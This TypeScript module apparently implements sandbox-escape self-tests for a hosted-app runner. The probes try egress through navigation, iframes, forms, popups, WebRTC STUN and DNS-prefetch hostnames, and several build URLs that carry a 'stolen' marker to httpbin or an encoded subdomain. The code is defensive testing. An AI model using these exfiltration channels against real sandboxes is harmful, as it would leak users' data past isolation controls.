/**
 * Breakout probes: deliberate attempts to escape the hosted-app sandbox.
 *
 * The Network tab asks "may I call this host?". These probes ask the harder
 * question: "can I leave at all?" Each one attacks a specific layer described in
 * `mindoodb/docs/hosted-app-isolation.md`, so a run doubles as a live check that
 * the documented containment is really in place.
 *
 * Two things to keep in mind when reading the results:
 *
 * - **A throw is a pass.** Every probe here is supposed to fail. `contained`
 *   means the browser or Haven refused; `escaped` means the app got out and the
 *   isolation model has a hole.
 * - **External mode is expected to fail almost all of them.** External apps run
 *   outside every policy Haven can apply, so these results are the argument for
 *   keeping external mode to loopback dev servers, not a bug report.
 * - **Storage and the wrapper DOM are not breakouts.** Each hosted app has an
 *   origin of its own, so it has real storage and a readable wrapper parent —
 *   both scoped to that origin and reaching nothing else. Probes that once
 *   treated a working origin as an escape were written for the old model where
 *   apps shared Haven's origin.
 *
 * @module isolationProbes
 */
import { readMindooDBAppHostingMode, type MindooDBAppHostingMode } from "mindoodb-app-sdk";

/**
 * Where a successful breakout would send data. httpbin is deliberately the same
 * host the Network tab uses as its not-on-the-allowlist example, so both tabs
 * tell one story.
 */
export const BREAKOUT_ORIGIN = "https://httpbin.org";

/**
 * Bundle id a hosted app would guess to reach a *different* app's assets. The
 * wrapper's `frame-src` names one bundle prefix, so this must not resolve.
 */
export const OTHER_BUNDLE_ID = "mindoodb-breakout-probe";

export type IsolationProbeId =
  | "self-navigation"
  | "cross-bundle-navigation"
  | "top-navigation"
  | "parent-navigation"
  | "nested-iframe"
  | "popup"
  | "form-action"
  | "haven-dom"
  | "app-storage"
  | "service-worker"
  | "cross-bundle-fetch"
  | "haven-page-fetch"
  | "webrtc"
  | "dns-prefetch";

/** `contained` is the desired result for every probe except the WebRTC one. */
export type IsolationOutcome = "contained" | "escaped" | "inconclusive";

export interface IsolationProbe {
  id: IsolationProbeId;
  label: string;
  /** The isolation layer this attacks, phrased the way the doc phrases it. */
  layer: string;
  /** What should happen in hosted mode. */
  hostedExpectation: string;
  /**
   * True when success would navigate the app away and end the session. Those
   * are kept out of "run all" so one click cannot destroy the demo.
   */
  endsSession?: boolean;
  /**
   * True when the probe genuinely sends packets to a third party rather than
   * only attempting to. Still listed and runnable on its own, but kept out of
   * "run all": a batch button should not reach out to someone else's server
   * without the person pressing it having chosen that specific probe.
   */
  sendsRealTraffic?: boolean;
}

export interface IsolationProbeResult {
  id: IsolationProbeId;
  outcome: IsolationOutcome;
  detail: string;
  elapsedMs: number;
}

export const ISOLATION_PROBES: IsolationProbe[] = [
  {
    id: "self-navigation",
    label: "Navigate this frame to httpbin",
    layer: "Wrapper document, frame-src pinned to this bundle",
    hostedExpectation:
      "Refused before any request leaves the browser. The violation is reported on the wrapper, not here, so this app sees nothing at all — check Haven for the blocked-navigation toast.",
    endsSession: true,
  },
  {
    id: "cross-bundle-navigation",
    label: "Navigate to another app's bundle",
    layer: "Wrapper document, frame-src path scope",
    hostedExpectation:
      "Refused. The wrapper names this bundle's prefix including its path, so a sibling bundle is off limits even though it is the same origin.",
    endsSession: true,
  },
  {
    id: "top-navigation",
    label: "Navigate Haven's top window",
    layer: "Sandbox without allow-top-navigation",
    hostedExpectation: "Throws. The app may not steer the tab Haven runs in.",
    endsSession: true,
  },
  {
    id: "parent-navigation",
    label: "Navigate the wrapper (the parent frame)",
    layer: "Sandboxed-navigation flag",
    hostedExpectation:
      "Throws. This is the attack that would replace the wrapper with a document that has no frame-src; a sandboxed frame may not navigate an ancestor, which is what makes the wrapper's policy authoritative.",
    endsSession: true,
  },
  {
    id: "nested-iframe",
    label: "Embed httpbin in a nested iframe",
    layer: "App CSP, frame-src 'self'",
    hostedExpectation:
      "Blocked, and unlike the navigation probes this one is visible here: the violation fires on this document, so it shows up in the report below.",
  },
  {
    id: "popup",
    label: "Open a popup window",
    layer: "Sandbox allow-popups capability",
    hostedExpectation:
      "Blocked unless the registration grants popups. This is the one switch that reopens a general egress path, so seeing it succeed after you tick the box is the point.",
  },
  {
    id: "form-action",
    label: "Submit a form to httpbin",
    layer: "App CSP, form-action",
    hostedExpectation:
      "Blocked, by `form-action` or by `frame-src` on the frame the post targets. A form post is egress like any other request. The result names whichever directive refused; if none did and the frame still holds a foreign document, that is a real hole.",
  },
  {
    id: "haven-dom",
    label: "Read Haven's DOM and URL",
    layer: "Separate origin",
    hostedExpectation:
      "Throws. Haven is `window.top` and a different origin, so its document, URL and globals are unreachable. The wrapper at `window.parent` stays readable — it is same-origin by design and holds nothing but this app's frame.",
  },
  {
    id: "app-storage",
    label: "Read localStorage",
    layer: "Separate origin",
    hostedExpectation:
      "Succeeds, and that is correct. The app has a real origin of its own, so it gets a real storage bucket — one that is empty on first launch and invisible to Haven and to every other app.",
  },
  {
    id: "service-worker",
    label: "Register a service worker",
    layer: "Separate origin",
    hostedExpectation:
      "Refused by `worker-src 'none'`, unless the registration has \"Allow workers\" ticked. That switch exists for apps doing real work in a Web Worker — CSP cannot separate the worker kinds, so allowing one allows all three. With it on, expect this to succeed and to report the scope it was given; the probe unregisters the worker again at once either way.",
  },
  {
    id: "cross-bundle-fetch",
    label: "Fetch another app's bundle assets",
    layer: "Haven service worker",
    hostedExpectation: "403 from Haven's worker. Guessing a bundle id gets you nothing.",
  },
  {
    id: "haven-page-fetch",
    label: "Fetch Haven's own page",
    layer: "Haven service worker",
    hostedExpectation:
      "403. Same origin after install, but only this bundle's asset prefix is readable.",
  },
  {
    id: "webrtc",
    label: "Reach an ICE server over WebRTC",
    layer: "Not covered by CSP or the service worker",
    hostedExpectation:
      "Escapes, and that is the honest answer. ICE traffic is not a fetch, so the service worker never sees it, and no CSP directive constrains iceServers. Sends real packets to a third-party STUN server, so it is left out of the batch run.",
    sendsRealTraffic: true,
  },
  {
    id: "dns-prefetch",
    label: "Leak through a DNS prefetch hint",
    layer: "Not covered by CSP or the service worker",
    hostedExpectation:
      "The hint is accepted: no directive governs resource hints, and a name lookup is not a fetch, so the service worker never sees it. The payload rides in the hostname. Whether the query really left cannot be observed from in here — the probe prints the name so you can look for it in a DNS log.",
    sendsRealTraffic: true,
  },
];

export function isolationProbe(id: IsolationProbeId): IsolationProbe {
  const probe = ISOLATION_PROBES.find((entry) => entry.id === id);
  if (!probe) {
    throw new Error(`Unknown isolation probe "${id}".`);
  }
  return probe;
}

export function safeProbes(): IsolationProbe[] {
  return ISOLATION_PROBES.filter((probe) => !probe.endsSession);
}

/**
 * What "run all" actually runs. Narrower than {@link safeProbes}, which is the
 * *rendered* list — a probe that reaches a third-party server stays visible and
 * individually runnable, it just is not swept up by the batch button.
 */
export function batchProbes(): IsolationProbe[] {
  return safeProbes().filter((probe) => !probe.sendsRealTraffic);
}

export function sessionEndingProbes(): IsolationProbe[] {
  return ISOLATION_PROBES.filter((probe) => probe.endsSession);
}

/**
 * STUN server the WebRTC probe points at. Any host off the app's allowlist
 * would do; a public STUN server is used because it answers reliably and costs
 * nobody anything. A hostile app would put its own TURN server here instead,
 * which relays payload rather than just reflecting an address back.
 */
const WEBRTC_PROBE_STUN_URL = "stun:stun.l.google.com:19302";

/** How long to wait for ICE gathering before calling the result unclear. */
const WEBRTC_PROBE_TIMEOUT_MS = 5_000;

/**
 * Zone the DNS probe invents a name under. Deliberately the app runner's own
 * zone: it has a wildcard record, so the name resolves instead of being
 * short-circuited, and its authoritative DNS is somewhere the operator of this
 * Haven can actually go and look. A hostile app would use a zone it controls
 * and read the payload straight out of its query log.
 */
const DNS_PROBE_ZONE = "mindoodb-apprunner.com";

/** How long to wait for a CSP violation to arrive before concluding none will. */
const DNS_PROBE_TIMEOUT_MS = 750;

/**
 * The URL a breakout would exfiltrate to. The marker stands in for whatever the
 * app scraped out of its mapped databases — the point of a navigation-based
 * leak is that the payload rides along in the query string.
 */
export function buildBreakoutUrl(marker: string): string {
  const url = new URL("/get", BREAKOUT_ORIGIN);
  url.searchParams.set("stolen", marker);
  return url.toString();
}

/**
 * Path a hosted app would use to reach a sibling bundle. Relative, because the
 * app does not know Haven's origin or its own bundle id, and `..` from the
 * bundle prefix is exactly the guess an attacker would make.
 */
export function crossBundlePath(file = "index.html"): string {
  return `../${OTHER_BUNDLE_ID}/${file}`;
}

export function formatProbeError(error: unknown): string {
  if (error instanceof DOMException) {
    return `${error.name}: ${error.message}`;
  }
  if (error instanceof Error) {
    return error.message ? `${error.name}: ${error.message}` : error.name;
  }
  return String(error);
}

export interface IsolationSummary {
  contained: number;
  escaped: number;
  inconclusive: number;
}

export function summarizeIsolationResults(results: IsolationProbeResult[]): IsolationSummary {
  return results.reduce<IsolationSummary>(
    (summary, result) => ({ ...summary, [result.outcome]: summary[result.outcome] + 1 }),
    { contained: 0, escaped: 0, inconclusive: 0 },
  );
}

/**
 * What the probe is expected to do in the mode the app is actually running in.
 *
 * External apps keep their own origin and their own storage, and Haven applies
 * no policy to them, so telling the reader "this should be blocked" there would
 * be wrong.
 */
export function describeExpectation(
  probe: IsolationProbe,
  hosting: MindooDBAppHostingMode,
): string {
  if (hosting === "hosted") {
    return probe.hostedExpectation;
  }
  return "External mode applies none of Haven's containment, so expect this to succeed. That is the reason external mode is limited to loopback dev servers.";
}

function delay(ms: number) {
  return new Promise<void>((resolve) => {
    window.setTimeout(resolve, ms);
  });
}

function elapsedSince(startedAt: number) {
  return Math.max(0, Math.round(performance.now() - startedAt));
}

/**
 * Ask for a navigation and then check whether we are still here.
 *
 * There is no event for "navigation refused by CSP" on this document — the
 * violation is reported on the frame's parent — so the only signal available to
 * the app is that it still exists a moment later. When the navigation does go
 * through, this never returns: the document is gone.
 */
async function attemptNavigation(navigate: () => void): Promise<IsolationProbeResult["outcome"]> {
  const before = window.location.href;
  navigate();
  await delay(900);
  return window.location.href === before ? "contained" : "escaped";
}

/**
 * Did a frame we created actually load the cross-origin document we asked for?
 *
 * We cannot read a cross-origin document, and that is precisely the signal: a
 * frame CSP refused stays on `about:blank`, which an opaque-origin parent may
 * still read, while a frame that really loaded httpbin throws on the same read.
 */
/**
 * Runs a frame navigation attempt and judges it, preferring the CSP violation
 * event over what the frame looks like afterwards.
 *
 * Reading the frame is a poor primary signal. A refusal can leave the frame on
 * a browser error document, and that document is cross-origin too — so the read
 * throws exactly like it would if the target really had loaded. The violation
 * event does not have that ambiguity: it fires only when a directive refused,
 * and it names which one.
 */
async function judgeFrameNavigation(options: {
  frame: HTMLIFrameElement;
  target: string;
  attempt: () => void;
  settleMs: number;
}): Promise<{ outcome: IsolationOutcome; detail: string }> {
  const host = new URL(options.target).host;
  const refusals: string[] = [];
  const onViolation = (event: SecurityPolicyViolationEvent) => {
    if (!event.blockedURI.includes(host)) {
      return;
    }
    refusals.push(event.violatedDirective || "an unnamed directive");
  };

  document.addEventListener("securitypolicyviolation", onViolation);
  try {
    options.attempt();
    await delay(options.settleMs);
  } finally {
    document.removeEventListener("securitypolicyviolation", onViolation);
  }

  if (refusals.length) {
    return {
      outcome: "contained",
      detail: `Refused by ${[...new Set(refusals)].join(" and ")}.`,
    };
  }
  const inspection = inspectFrameNavigation(options.frame);
  if (inspection.outcome === "contained") {
    return inspection;
  }
  return {
    outcome: inspection.outcome,
    detail: `${inspection.detail} No CSP violation fired, so nothing refused this.`,
  };
}

function inspectFrameNavigation(frame: HTMLIFrameElement): {
  outcome: IsolationOutcome;
  detail: string;
} {
  try {
    const href = frame.contentWindow?.location.href ?? "";
    if (!href || href === "about:blank") {
      return { outcome: "contained", detail: "The frame never left about:blank." };
    }
    return { outcome: "escaped", detail: `The frame loaded ${href}.` };
  } catch (error) {
    // Reading threw, so a real cross-origin document is sitting in there.
    return {
      outcome: "escaped",
      detail: `The frame loaded a cross-origin document (${formatProbeError(error)}).`,
    };
  }
}

/**
 * A label unique per run. Without it the second run would hit the DNS cache and
 * never leave the machine, which would look like containment.
 */
function probeMarker(): string {
  const random = globalThis.crypto?.randomUUID?.();
  return (random ?? Math.random().toString(36).slice(2)).replace(/-/g, "").slice(0, 12);
}

/**
 * Inserts a resource hint and resolves with the CSP violation it drew, or null
 * if the policy let it through.
 *
 * Only the *policy* decision is observable here. Whether the browser then went
 * on to resolve the name happens below the JS layer, which is the whole reason
 * this channel is interesting to an attacker.
 */
function insertResourceHint(rel: string, host: string): Promise<string | null> {
  return new Promise((resolve) => {
    const onViolation = (event: SecurityPolicyViolationEvent) => {
      if (!event.blockedURI.includes(host)) {
        return;
      }
      finish(event.violatedDirective || "unnamed directive");
    };
    const finish = (directive: string | null) => {
      clearTimeout(timer);
      document.removeEventListener("securitypolicyviolation", onViolation);
      link.remove();
      resolve(directive);
    };
    const timer = setTimeout(() => finish(null), DNS_PROBE_TIMEOUT_MS);
    document.addEventListener("securitypolicyviolation", onViolation);
    const link = document.createElement("link");
    link.rel = rel;
    link.href = `//${host}`;
    document.head.append(link);
  });
}

/**
 * Resolves with the type of the first candidate that could only exist if the
 * STUN/TURN server answered ("srflx" or "relay"), or null if gathering finishes
 * or times out with nothing but local candidates.
 *
 * Host candidates prove nothing — the browser makes those up from local
 * interfaces without sending a packet. A server-reflexive one is the evidence:
 * the address in it came back *from* the server.
 */
function waitForReflexiveCandidate(connection: RTCPeerConnection): Promise<string | null> {
  return new Promise((resolve) => {
    const finish = (type: string | null) => {
      clearTimeout(timer);
      connection.removeEventListener("icecandidate", onCandidate);
      resolve(type);
    };
    const onCandidate = (event: RTCPeerConnectionIceEvent) => {
      // A null candidate marks the end of gathering.
      if (!event.candidate) {
        finish(null);
        return;
      }
      const type = reflexiveCandidateType(event.candidate);
      if (type) {
        finish(type);
      }
    };
    const timer = setTimeout(() => finish(null), WEBRTC_PROBE_TIMEOUT_MS);
    connection.addEventListener("icecandidate", onCandidate);
  });
}

/**
 * `RTCIceCandidate.type` is unset in some engines, so fall back to the SDP
 * attribute, where the type follows the literal "typ" token.
 */
function reflexiveCandidateType(candidate: RTCIceCandidate): string | null {
  const type = candidate.type ?? /\btyp\s+(\w+)/.exec(candidate.candidate)?.[1] ?? null;
  return type === "srflx" || type === "relay" ? type : null;
}

async function runProbeById(id: IsolationProbeId): Promise<Omit<IsolationProbeResult, "elapsedMs">> {
  switch (id) {
    case "self-navigation": {
      const target = buildBreakoutUrl("mapped-database-contents");
      try {
        const outcome = await attemptNavigation(() => {
          window.location.href = target;
        });
        return {
          id,
          outcome,
          detail:
            outcome === "contained"
              ? `Still here after asking for ${target}. The navigation never happened and no request left the browser.`
              : `Navigated to ${target}.`,
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
    }

    case "cross-bundle-navigation": {
      const target = crossBundlePath();
      try {
        const outcome = await attemptNavigation(() => {
          window.location.href = target;
        });
        return {
          id,
          outcome,
          detail:
            outcome === "contained"
              ? `Still here after asking for ${target}.`
              : `Navigated to ${window.location.href}.`,
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
    }

    case "top-navigation": {
      const target = buildBreakoutUrl("top-navigation");
      try {
        // Reading `top.location.href` throws on its own across an opaque
        // boundary, so assign without reading first.
        window.top!.location.href = target;
        await delay(900);
        return {
          id,
          outcome: "contained",
          detail: "No error thrown, but Haven's tab did not move.",
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
    }

    case "parent-navigation": {
      const target = buildBreakoutUrl("parent-navigation");
      try {
        window.parent.location.href = target;
        await delay(900);
        return {
          id,
          outcome: window.parent === window.self ? "inconclusive" : "contained",
          detail:
            window.parent === window.self
              ? "This app is not framed, so there is no parent to navigate."
              : "No error thrown, but the parent frame did not move.",
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
    }

    case "nested-iframe": {
      const target = buildBreakoutUrl("nested-iframe");
      const frame = document.createElement("iframe");
      frame.setAttribute("aria-hidden", "true");
      frame.style.display = "none";
      document.body.appendChild(frame);
      const verdict = await judgeFrameNavigation({
        frame,
        target,
        attempt: () => {
          frame.src = target;
        },
        settleMs: 1200,
      });
      frame.remove();
      return {
        id,
        outcome: verdict.outcome,
        detail: `Requested ${target} in a nested iframe. ${verdict.detail}`,
      };
    }

    case "popup": {
      const target = buildBreakoutUrl("popup");
      // Deliberately no `noopener`: that feature makes window.open return null
      // even on success, which would report every popup as blocked.
      const opened = window.open(target, "_blank");
      if (!opened) {
        return {
          id,
          outcome: "contained",
          detail: "window.open returned null. The sandbox has no allow-popups capability.",
        };
      }
      opened.close();
      return {
        id,
        outcome: "escaped",
        detail: `A popup opened to ${target} and was closed again. Popups are granted for this app, so this is an open egress path by configuration.`,
      };
    }

    case "form-action": {
      const target = buildBreakoutUrl("form-action");
      const sink = document.createElement("iframe");
      sink.name = `probe-form-sink-${Date.now()}`;
      sink.setAttribute("aria-hidden", "true");
      sink.style.display = "none";
      document.body.appendChild(sink);

      const form = document.createElement("form");
      form.method = "GET";
      form.action = target;
      // Targeting a hidden frame keeps a successful post from replacing the app.
      form.target = sink.name;
      form.style.display = "none";
      document.body.appendChild(form);
      try {
        const verdict = await judgeFrameNavigation({
          frame: sink,
          target,
          attempt: () => {
            form.submit();
          },
          settleMs: 900,
        });
        return {
          id,
          outcome: verdict.outcome,
          detail: `Submitted to ${target} into a hidden frame. ${verdict.detail}`,
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      } finally {
        form.remove();
        sink.remove();
      }
    }

    case "haven-dom": {
      // Reach for Haven, which is `window.top`. `window.parent` is the
      // containment wrapper, and that one is same-origin with the app on
      // purpose: it has to be served from the app origin to carry a `frame-src`
      // about that origin's paths. Reading it proves nothing — it holds a
      // single iframe and no data — so probing it would report a break-in to a
      // room the app already owns.
      if (window.top === window.self) {
        return {
          id,
          outcome: "inconclusive",
          detail:
            "This document is not framed, so there is no Haven window to reach. Run the probe in embedded mode.",
        };
      }
      let wrapperNote = "";
      try {
        wrapperNote = ` The wrapper at window.parent stays readable ("${window.parent.document.title}"), which is by design.`;
      } catch {
        // External mode frames the app directly, so there is no wrapper.
      }
      try {
        const title = window.top?.document.title;
        return {
          id,
          outcome: "escaped",
          detail: `Read Haven's own document. Its title is "${title}".`,
        };
      } catch (error) {
        return { id, outcome: "contained", detail: `${formatProbeError(error)}${wrapperNote}` };
      }
    }

    case "app-storage": {
      // Working storage is not a breakout. Each app runs on its own origin, so
      // the bucket it reaches belongs to that origin — never Haven's, never
      // another app's. The browser's same-origin policy is what guarantees it,
      // which is why there is nothing here for the app to defeat.
      try {
        const probeKey = "mindoodb-breakout-probe";
        window.localStorage.setItem(probeKey, "1");
        window.localStorage.removeItem(probeKey);
        return {
          id,
          outcome: "contained",
          detail: `localStorage works and is scoped to ${window.location.origin}, this app's own origin. Haven's storage and every other app's sit on different origins and stay unreachable.`,
        };
      } catch (error) {
        return {
          id,
          outcome: "inconclusive",
          detail: `${formatProbeError(error)} An app origin is supposed to have a storage bucket, so this points at a launch problem rather than at containment.`,
        };
      }
    }

    case "service-worker": {
      if (!("serviceWorker" in navigator)) {
        return {
          id,
          outcome: "contained",
          detail: "navigator.serviceWorker is not available in this document.",
        };
      }
      let registration: ServiceWorkerRegistration;
      try {
        registration = await navigator.serviceWorker.register("./breakout-sw.js");
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
      // Registering at all is the finding, so undo it straight away. Left in
      // place this worker would control the app on its next load, and the demo
      // would run hijacked from then on — see `public/breakout-sw.js`.
      try {
        return {
          id,
          outcome: "escaped",
          detail:
            `Registered a worker of the app's own, scoped to ${registration.scope}. `
            + "It does not claim the open page, so nothing breaks right now, and the probe "
            + "unregisters it again immediately. On the next load it would control the app "
            + "and see every request it makes — whether its own fetches would then bypass "
            + "the runner's allowlist is a separate question this probe does not answer.",
        };
      } finally {
        await registration.unregister();
      }
    }

    case "cross-bundle-fetch": {
      const target = crossBundlePath();
      try {
        const response = await fetch(target);
        return {
          id,
          outcome: response.ok ? "escaped" : "contained",
          detail: `HTTP ${response.status} for ${target}.`,
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
    }

    case "haven-page-fetch": {
      try {
        const response = await fetch("/index.html");
        return {
          id,
          outcome: response.ok ? "escaped" : "contained",
          detail: `HTTP ${response.status} for Haven's own /index.html.`,
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      }
    }

    case "webrtc": {
      if (typeof RTCPeerConnection === "undefined") {
        return {
          id,
          outcome: "contained",
          detail: "RTCPeerConnection is not available in this document.",
        };
      }
      const connection = new RTCPeerConnection({
        iceServers: [{ urls: WEBRTC_PROBE_STUN_URL }],
      });
      try {
        connection.createDataChannel("probe");
        const reflexive = waitForReflexiveCandidate(connection);
        await connection.setLocalDescription(await connection.createOffer());
        const candidateType = await reflexive;
        if (candidateType) {
          return {
            id,
            outcome: "escaped",
            detail: `Gathered a "${candidateType}" ICE candidate from ${WEBRTC_PROBE_STUN_URL}. That host is on no allowlist, and the round trip succeeded: the app sent packets to a server of its choosing and got an answer. The service worker never saw it, because ICE is not a fetch. The reflected address is withheld here — it is your public IP.`,
          };
        }
        return {
          id,
          outcome: "inconclusive",
          detail: `No server-reflexive candidate within ${WEBRTC_PROBE_TIMEOUT_MS} ms. That is usually the local network dropping UDP, not Haven containing anything — nothing here shows the channel is closed.`,
        };
      } catch (error) {
        return { id, outcome: "contained", detail: formatProbeError(error) };
      } finally {
        connection.close();
      }
    }

    case "dns-prefetch": {
      const marker = probeMarker();
      // Two hints, because they leak differently. `dns-prefetch` gets the name
      // to a resolver; `preconnect` goes further and completes a TCP and TLS
      // handshake, putting the name on the wire again in the TLS SNI field.
      // Either way the payload is the hostname, so neither needs a response.
      const dnsHost = `stolen-${marker}.${DNS_PROBE_ZONE}`;
      const preconnectHost = `stolen-${marker}-pre.${DNS_PROBE_ZONE}`;
      const [dnsBlocked, preconnectBlocked] = await Promise.all([
        insertResourceHint("dns-prefetch", dnsHost),
        insertResourceHint("preconnect", preconnectHost),
      ]);

      if (dnsBlocked && preconnectBlocked) {
        return {
          id,
          outcome: "contained",
          detail: `Both hints were refused (${dnsBlocked}, ${preconnectBlocked}).`,
        };
      }
      const survived = [
        dnsBlocked ? null : `dns-prefetch → ${dnsHost}`,
        preconnectBlocked ? null : `preconnect → ${preconnectHost}`,
      ].filter((entry): entry is string => entry !== null);
      return {
        id,
        outcome: "inconclusive",
        detail: `No policy stopped ${survived.join(" and ")}. What that proves is only that nothing refused the hint — a name lookup is invisible from inside the page, so look for these names in a DNS query log to see whether they actually left. A hostile app would put stolen data where "${marker}" sits.`,
      };
    }

    default: {
      const exhaustive: never = id;
      throw new Error(`Unhandled isolation probe "${String(exhaustive)}".`);
    }
  }
}

export async function runIsolationProbe(id: IsolationProbeId): Promise<IsolationProbeResult> {
  const startedAt = performance.now();
  try {
    const result = await runProbeById(id);
    return { ...result, elapsedMs: elapsedSince(startedAt) };
  } catch (error) {
    // A probe that throws on its way out still tells us the app was stopped.
    return {
      id,
      outcome: "contained",
      detail: formatProbeError(error),
      elapsedMs: elapsedSince(startedAt),
    };
  }
}

export function currentHostingMode(): MindooDBAppHostingMode {
  return readMindooDBAppHostingMode();
}
